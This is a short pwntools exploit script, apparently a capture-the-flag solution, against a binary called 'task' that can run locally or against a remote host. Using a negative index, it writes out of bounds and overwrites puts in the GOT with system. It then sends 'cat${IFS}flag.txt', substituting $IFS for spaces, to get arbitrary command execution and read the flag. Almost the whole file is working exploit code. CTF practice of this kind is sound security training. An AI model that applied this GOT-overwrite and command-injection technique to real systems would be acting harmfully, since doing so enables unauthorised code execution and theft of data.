from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		# "b *main+182",
		"b *change_user_nick+277",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

p.sendlineafter(b'Your choice: ', b'2') # change user name
p.sendlineafter(b'Select index: ', b'-9') # index for change  users-(-10 * 0x10) = puts@got
# overwrite puts with system
p.sendlineafter(b'Provide new name: ', p64(elf.symbols['system']))

# from now we have puts that behaving like system 
p.sendline(b'2') # change user name
p.sendline(b'0') # does not matter
p.sendline(b'cat${IFS}flag.txt')  # cat flag, command cant have spaces because of fgets
p.sendlineafter(b'Your choice: ', b'4')

# p.interactive()
print(p.clean(1.0))
